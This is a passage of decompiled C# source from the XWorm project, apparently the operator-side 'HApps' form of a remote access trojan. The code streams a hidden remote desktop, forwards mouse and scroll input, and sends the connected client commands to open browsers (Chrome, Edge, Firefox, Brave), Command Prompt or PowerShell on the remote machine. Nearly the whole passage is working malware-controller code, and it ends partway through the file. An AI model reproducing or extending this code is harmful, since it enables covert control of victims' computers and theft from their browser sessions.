using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000018 RID: 24
	[DesignerGenerated]
	public partial class HApps : Form
	{
		// Token: 0x06000500 RID: 1280 RVA: 0x0002DEF0 File Offset: 0x0002C0F0
		public HApps()
		{
			base.Load += this.HApps_Load;
			base.FormClosing += this.HApps_FormClosing;
			base.ResizeEnd += this.HApps_ResizeEnd;
			this.FPS = 0;
			this.sw = Stopwatch.StartNew();
			this.rdSize = default(Size);
			this.InitializeComponent();
		}

		// Token: 0x170001DF RID: 479
		// (get) Token: 0x06000503 RID: 1283 RVA: 0x0002F7E2 File Offset: 0x0002D9E2
		// (set) Token: 0x06000504 RID: 1284 RVA: 0x0002F7EC File Offset: 0x0002D9EC
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E0 RID: 480
		// (get) Token: 0x06000505 RID: 1285 RVA: 0x0002F7F5 File Offset: 0x0002D9F5
		// (set) Token: 0x06000506 RID: 1286 RVA: 0x0002F7FF File Offset: 0x0002D9FF
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E1 RID: 481
		// (get) Token: 0x06000507 RID: 1287 RVA: 0x0002F808 File Offset: 0x0002DA08
		// (set) Token: 0x06000508 RID: 1288 RVA: 0x0002F814 File Offset: 0x0002DA14
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001E2 RID: 482
		// (get) Token: 0x06000509 RID: 1289 RVA: 0x0002F857 File Offset: 0x0002DA57
		// (set) Token: 0x0600050A RID: 1290 RVA: 0x0002F861 File Offset: 0x0002DA61
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E3 RID: 483
		// (get) Token: 0x0600050B RID: 1291 RVA: 0x0002F86A File Offset: 0x0002DA6A
		// (set) Token: 0x0600050C RID: 1292 RVA: 0x0002F874 File Offset: 0x0002DA74
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E4 RID: 484
		// (get) Token: 0x0600050D RID: 1293 RVA: 0x0002F87D File Offset: 0x0002DA7D
		// (set) Token: 0x0600050E RID: 1294 RVA: 0x0002F887 File Offset: 0x0002DA87
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E5 RID: 485
		// (get) Token: 0x0600050F RID: 1295 RVA: 0x0002F890 File Offset: 0x0002DA90
		// (set) Token: 0x06000510 RID: 1296 RVA: 0x0002F89A File Offset: 0x0002DA9A
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E6 RID: 486
		// (get) Token: 0x06000511 RID: 1297 RVA: 0x0002F8A3 File Offset: 0x0002DAA3
		// (set) Token: 0x06000512 RID: 1298 RVA: 0x0002F8B0 File Offset: 0x0002DAB0
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.ListView1_KeyDown);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.KeyDown -= value2;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.KeyDown += value2;
				}
			}
		}

		// Token: 0x170001E7 RID: 487
		// (get) Token: 0x06000513 RID: 1299 RVA: 0x0002F8F3 File Offset: 0x0002DAF3
		// (set) Token: 0x06000514 RID: 1300 RVA: 0x0002F8FD File Offset: 0x0002DAFD
		internal virtual ColumnHeader ColumnHeader3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E8 RID: 488
		// (get) Token: 0x06000515 RID: 1301 RVA: 0x0002F906 File Offset: 0x0002DB06
		// (set) Token: 0x06000516 RID: 1302 RVA: 0x0002F910 File Offset: 0x0002DB10
		internal virtual ColumnHeader ColumnHeader4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001E9 RID: 489
		// (get) Token: 0x06000517 RID: 1303 RVA: 0x0002F919 File Offset: 0x0002DB19
		// (set) Token: 0x06000518 RID: 1304 RVA: 0x0002F924 File Offset: 0x0002DB24
		internal virtual PictureBox PictureBox1
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.PictureBox1_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.PictureBox1_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.PictureBox1_MouseUp);
				KeyPressEventHandler value5 = new KeyPressEventHandler(this.PictureBox1_KeyPress);
				EventHandler value6 = new EventHandler(this.PictureBox1_MouseEnter);
				PictureBox pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseDown -= value2;
					pictureBox.MouseMove -= value3;
					pictureBox.MouseUp -= value4;
					pictureBox.KeyPress -= value5;
					pictureBox.MouseEnter -= value6;
				}
				this._PictureBox1 = value;
				pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseDown += value2;
					pictureBox.MouseMove += value3;
					pictureBox.MouseUp += value4;
					pictureBox.KeyPress += value5;
					pictureBox.MouseEnter += value6;
				}
			}
		}

		// Token: 0x170001EA RID: 490
		// (get) Token: 0x06000519 RID: 1305 RVA: 0x0002F9E4 File Offset: 0x0002DBE4
		// (set) Token: 0x0600051A RID: 1306 RVA: 0x0002F9EE File Offset: 0x0002DBEE
		internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001EB RID: 491
		// (get) Token: 0x0600051B RID: 1307 RVA: 0x0002F9F7 File Offset: 0x0002DBF7
		// (set) Token: 0x0600051C RID: 1308 RVA: 0x0002FA04 File Offset: 0x0002DC04
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ToggleSwitch2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Guna2ToggleSwitch2_MouseClick);
				Guna2ToggleSwitch guna2ToggleSwitch = this._Guna2ToggleSwitch2;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick -= value2;
				}
				this._Guna2ToggleSwitch2 = value;
				guna2ToggleSwitch = this._Guna2ToggleSwitch2;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick += value2;
				}
			}
		}

		// Token: 0x170001EC RID: 492
		// (get) Token: 0x0600051D RID: 1309 RVA: 0x0002FA47 File Offset: 0x0002DC47
		// (set) Token: 0x0600051E RID: 1310 RVA: 0x0002FA51 File Offset: 0x0002DC51
		internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001ED RID: 493
		// (get) Token: 0x0600051F RID: 1311 RVA: 0x0002FA5A File Offset: 0x0002DC5A
		// (set) Token: 0x06000520 RID: 1312 RVA: 0x0002FA64 File Offset: 0x0002DC64
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001EE RID: 494
		// (get) Token: 0x06000521 RID: 1313 RVA: 0x0002FA6D File Offset: 0x0002DC6D
		// (set) Token: 0x06000522 RID: 1314 RVA: 0x0002FA77 File Offset: 0x0002DC77
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001EF RID: 495
		// (get) Token: 0x06000523 RID: 1315 RVA: 0x0002FA80 File Offset: 0x0002DC80
		// (set) Token: 0x06000524 RID: 1316 RVA: 0x0002FA8A File Offset: 0x0002DC8A
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001F0 RID: 496
		// (get) Token: 0x06000525 RID: 1317 RVA: 0x0002FA93 File Offset: 0x0002DC93
		// (set) Token: 0x06000526 RID: 1318 RVA: 0x0002FAA0 File Offset: 0x0002DCA0
		internal virtual ToolStripMenuItem GetScreenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._GetScreenToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GetScreenToolStripMenuItem_Click);
				ToolStripMenuItem getScreenToolStripMenuItem = this._GetScreenToolStripMenuItem;
				if (getScreenToolStripMenuItem != null)
				{
					getScreenToolStripMenuItem.Click -= value2;
				}
				this._GetScreenToolStripMenuItem = value;
				getScreenToolStripMenuItem = this._GetScreenToolStripMenuItem;
				if (getScreenToolStripMenuItem != null)
				{
					getScreenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F1 RID: 497
		// (get) Token: 0x06000527 RID: 1319 RVA: 0x0002FAE3 File Offset: 0x0002DCE3
		// (set) Token: 0x06000528 RID: 1320 RVA: 0x0002FAF0 File Offset: 0x0002DCF0
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F2 RID: 498
		// (get) Token: 0x06000529 RID: 1321 RVA: 0x0002FB33 File Offset: 0x0002DD33
		// (set) Token: 0x0600052A RID: 1322 RVA: 0x0002FB3D File Offset: 0x0002DD3D
		internal virtual ToolStripMenuItem BrowserToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001F3 RID: 499
		// (get) Token: 0x0600052B RID: 1323 RVA: 0x0002FB46 File Offset: 0x0002DD46
		// (set) Token: 0x0600052C RID: 1324 RVA: 0x0002FB50 File Offset: 0x0002DD50
		internal virtual ToolStripMenuItem MicrosoftEdgeToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._MicrosoftEdgeToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrosoftEdgeToolStripMenuItem_Click);
				ToolStripMenuItem microsoftEdgeToolStripMenuItem = this._MicrosoftEdgeToolStripMenuItem;
				if (microsoftEdgeToolStripMenuItem != null)
				{
					microsoftEdgeToolStripMenuItem.Click -= value2;
				}
				this._MicrosoftEdgeToolStripMenuItem = value;
				microsoftEdgeToolStripMenuItem = this._MicrosoftEdgeToolStripMenuItem;
				if (microsoftEdgeToolStripMenuItem != null)
				{
					microsoftEdgeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F4 RID: 500
		// (get) Token: 0x0600052D RID: 1325 RVA: 0x0002FB93 File Offset: 0x0002DD93
		// (set) Token: 0x0600052E RID: 1326 RVA: 0x0002FB9D File Offset: 0x0002DD9D
		internal virtual ToolStripMenuItem ApplactionsToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001F5 RID: 501
		// (get) Token: 0x0600052F RID: 1327 RVA: 0x0002FBA6 File Offset: 0x0002DDA6
		// (set) Token: 0x06000530 RID: 1328 RVA: 0x0002FBB0 File Offset: 0x0002DDB0
		internal virtual ToolStripMenuItem CommandPromptToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CommandPromptToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CommandPromptToolStripMenuItem_Click);
				ToolStripMenuItem commandPromptToolStripMenuItem = this._CommandPromptToolStripMenuItem;
				if (commandPromptToolStripMenuItem != null)
				{
					commandPromptToolStripMenuItem.Click -= value2;
				}
				this._CommandPromptToolStripMenuItem = value;
				commandPromptToolStripMenuItem = this._CommandPromptToolStripMenuItem;
				if (commandPromptToolStripMenuItem != null)
				{
					commandPromptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F6 RID: 502
		// (get) Token: 0x06000531 RID: 1329 RVA: 0x0002FBF3 File Offset: 0x0002DDF3
		// (set) Token: 0x06000532 RID: 1330 RVA: 0x0002FC00 File Offset: 0x0002DE00
		internal virtual ToolStripMenuItem PowerShellToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PowerShellToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PowerShellToolStripMenuItem_Click);
				ToolStripMenuItem powerShellToolStripMenuItem = this._PowerShellToolStripMenuItem;
				if (powerShellToolStripMenuItem != null)
				{
					powerShellToolStripMenuItem.Click -= value2;
				}
				this._PowerShellToolStripMenuItem = value;
				powerShellToolStripMenuItem = this._PowerShellToolStripMenuItem;
				if (powerShellToolStripMenuItem != null)
				{
					powerShellToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F7 RID: 503
		// (get) Token: 0x06000533 RID: 1331 RVA: 0x0002FC43 File Offset: 0x0002DE43
		// (set) Token: 0x06000534 RID: 1332 RVA: 0x0002FC50 File Offset: 0x0002DE50
		internal virtual ToolStripMenuItem CustomOpenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CustomOpenToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CustomOpenToolStripMenuItem_Click);
				ToolStripMenuItem customOpenToolStripMenuItem = this._CustomOpenToolStripMenuItem;
				if (customOpenToolStripMenuItem != null)
				{
					customOpenToolStripMenuItem.Click -= value2;
				}
				this._CustomOpenToolStripMenuItem = value;
				customOpenToolStripMenuItem = this._CustomOpenToolStripMenuItem;
				if (customOpenToolStripMenuItem != null)
				{
					customOpenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001F8 RID: 504
		// (get) Token: 0x06000535 RID: 1333 RVA: 0x0002FC93 File Offset: 0x0002DE93
		// (set) Token: 0x06000536 RID: 1334 RVA: 0x0002FC9D File Offset: 0x0002DE9D
		internal virtual ToolStripMenuItem WindowToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001F9 RID: 505
		// (get) Token: 0x06000537 RID: 1335 RVA: 0x0002FCA6 File Offset: 0x0002DEA6
		// (set) Token: 0x06000538 RID: 1336 RVA: 0x0002FCB0 File Offset: 0x0002DEB0
		internal virtual ToolStripMenuItem RestoreToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RestoreToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestoreToolStripMenuItem_Click);
				ToolStripMenuItem restoreToolStripMenuItem = this._RestoreToolStripMenuItem;
				if (restoreToolStripMenuItem != null)
				{
					restoreToolStripMenuItem.Click -= value2;
				}
				this._RestoreToolStripMenuItem = value;
				restoreToolStripMenuItem = this._RestoreToolStripMenuItem;
				if (restoreToolStripMenuItem != null)
				{
					restoreToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FA RID: 506
		// (get) Token: 0x06000539 RID: 1337 RVA: 0x0002FCF3 File Offset: 0x0002DEF3
		// (set) Token: 0x0600053A RID: 1338 RVA: 0x0002FD00 File Offset: 0x0002DF00
		internal virtual ToolStripMenuItem RestartToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RestartToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem_Click);
				ToolStripMenuItem restartToolStripMenuItem = this._RestartToolStripMenuItem;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click -= value2;
				}
				this._RestartToolStripMenuItem = value;
				restartToolStripMenuItem = this._RestartToolStripMenuItem;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FB RID: 507
		// (get) Token: 0x0600053B RID: 1339 RVA: 0x0002FD43 File Offset: 0x0002DF43
		// (set) Token: 0x0600053C RID: 1340 RVA: 0x0002FD50 File Offset: 0x0002DF50
		internal virtual ToolStripMenuItem CloseToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CloseToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseToolStripMenuItem_Click);
				ToolStripMenuItem closeToolStripMenuItem = this._CloseToolStripMenuItem;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click -= value2;
				}
				this._CloseToolStripMenuItem = value;
				closeToolStripMenuItem = this._CloseToolStripMenuItem;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FC RID: 508
		// (get) Token: 0x0600053D RID: 1341 RVA: 0x0002FD93 File Offset: 0x0002DF93
		// (set) Token: 0x0600053E RID: 1342 RVA: 0x0002FDA0 File Offset: 0x0002DFA0
		internal virtual ToolStripMenuItem ChromeToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ChromeToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChromeToolStripMenuItem_Click);
				ToolStripMenuItem chromeToolStripMenuItem = this._ChromeToolStripMenuItem;
				if (chromeToolStripMenuItem != null)
				{
					chromeToolStripMenuItem.Click -= value2;
				}
				this._ChromeToolStripMenuItem = value;
				chromeToolStripMenuItem = this._ChromeToolStripMenuItem;
				if (chromeToolStripMenuItem != null)
				{
					chromeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FD RID: 509
		// (get) Token: 0x0600053F RID: 1343 RVA: 0x0002FDE3 File Offset: 0x0002DFE3
		// (set) Token: 0x06000540 RID: 1344 RVA: 0x0002FDF0 File Offset: 0x0002DFF0
		internal virtual ToolStripMenuItem FireFoxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FireFoxToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FireFoxToolStripMenuItem_Click);
				ToolStripMenuItem fireFoxToolStripMenuItem = this._FireFoxToolStripMenuItem;
				if (fireFoxToolStripMenuItem != null)
				{
					fireFoxToolStripMenuItem.Click -= value2;
				}
				this._FireFoxToolStripMenuItem = value;
				fireFoxToolStripMenuItem = this._FireFoxToolStripMenuItem;
				if (fireFoxToolStripMenuItem != null)
				{
					fireFoxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FE RID: 510
		// (get) Token: 0x06000541 RID: 1345 RVA: 0x0002FE33 File Offset: 0x0002E033
		// (set) Token: 0x06000542 RID: 1346 RVA: 0x0002FE40 File Offset: 0x0002E040
		internal virtual ToolStripMenuItem BraveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._BraveToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BraveToolStripMenuItem_Click);
				ToolStripMenuItem braveToolStripMenuItem = this._BraveToolStripMenuItem;
				if (braveToolStripMenuItem != null)
				{
					braveToolStripMenuItem.Click -= value2;
				}
				this._BraveToolStripMenuItem = value;
				braveToolStripMenuItem = this._BraveToolStripMenuItem;
				if (braveToolStripMenuItem != null)
				{
					braveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001FF RID: 511
		// (get) Token: 0x06000543 RID: 1347 RVA: 0x0002FE83 File Offset: 0x0002E083
		// (set) Token: 0x06000544 RID: 1348 RVA: 0x0002FE8D File Offset: 0x0002E08D
		internal virtual ToolStripStatusLabel ToolStripStatusLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000200 RID: 512
		// (get) Token: 0x06000545 RID: 1349 RVA: 0x0002FE96 File Offset: 0x0002E096
		// (set) Token: 0x06000546 RID: 1350 RVA: 0x0002FEA0 File Offset: 0x0002E0A0
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000201 RID: 513
		// (get) Token: 0x06000547 RID: 1351 RVA: 0x0002FEA9 File Offset: 0x0002E0A9
		// (set) Token: 0x06000548 RID: 1352 RVA: 0x0002FEB4 File Offset: 0x0002E0B4
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000202 RID: 514
		// (get) Token: 0x06000549 RID: 1353 RVA: 0x0002FEF7 File Offset: 0x0002E0F7
		// (set) Token: 0x0600054A RID: 1354 RVA: 0x0002FF04 File Offset: 0x0002E104
		internal virtual Guna2GradientButton Guna2GradientButton5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton5_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton5 = value;
				guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x0600054B RID: 1355 RVA: 0x0002FF48 File Offset: 0x0002E148
		private void MicrosoftEdgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenEdgeBrowser");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600054C RID: 1356 RVA: 0x0002FF86 File Offset: 0x0002E186
		private void HApps_Load(object sender, EventArgs e)
		{
			base.MouseWheel += this.MyMouseWheel;
			this.Guna2ComboBox1.SelectedIndex = 3;
			this.Guna2GradientButton1.PerformClick();
		}

		// Token: 0x0600054D RID: 1357 RVA: 0x0002FFB8 File Offset: 0x0002E1B8
		private void MyMouseWheel(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				bool flag2 = e.Delta < 0;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"ScrollDown",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					byte[] state2 = Helper.SB(string.Concat(new string[]
					{
						"ScrollUp",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x0600054E RID: 1358 RVA: 0x00030158 File Offset: 0x0002E358
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600054F RID: 1359 RVA: 0x000301B0 File Offset: 0x0002E3B0
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "OFF", false) == 0;
			if (flag)
			{
				this.Guna2GradientButton1.Text = "Capturing...";
				this.Guna2GradientButton1.Image = Resources._Stop;
				byte[] state = Helper.SB("HApps+" + SettingsHelper.SPL + this.Guna2ComboBox1.Text.Replace("%", "").ToString());
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			else
			{
				this.Guna2GradientButton1.Text = "OFF";
				this.Guna2GradientButton1.Image = Resources.Play;
			}
		}

		// Token: 0x06000550 RID: 1360 RVA: 0x00030280 File Offset: 0x0002E480
		private void GetScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"GetHWND",
					SettingsHelper.SPL,
					this.ListView1.SelectedItems[0].SubItems[0].Text,
					SettingsHelper.SPL,
					this.ListView1.SelectedItems[0].ImageKey.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000551 RID: 1361 RVA: 0x00030378 File Offset: 0x0002E578
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("Refresh");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000552 RID: 1362 RVA: 0x000303B8 File Offset: 0x0002E5B8
		private void ChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenChromeBrowser");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000553 RID: 1363 RVA: 0x000303F8 File Offset: 0x0002E5F8
		private void FireFoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenFireFoxBrowser");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000554 RID: 1364 RVA: 0x00030438 File Offset: 0x0002E638
		private void BraveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenBraveBrowser");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000555 RID: 1365 RVA: 0x00030478 File Offset: 0x0002E678
		private void CommandPromptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenCommandPrompt");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000556 RID: 1366 RVA: 0x000304B8 File Offset: 0x0002E6B8
		private void PowerShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("OpenPowerShell");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000557 RID: 1367 RVA: 0x000304F8 File Offset: 0x0002E6F8
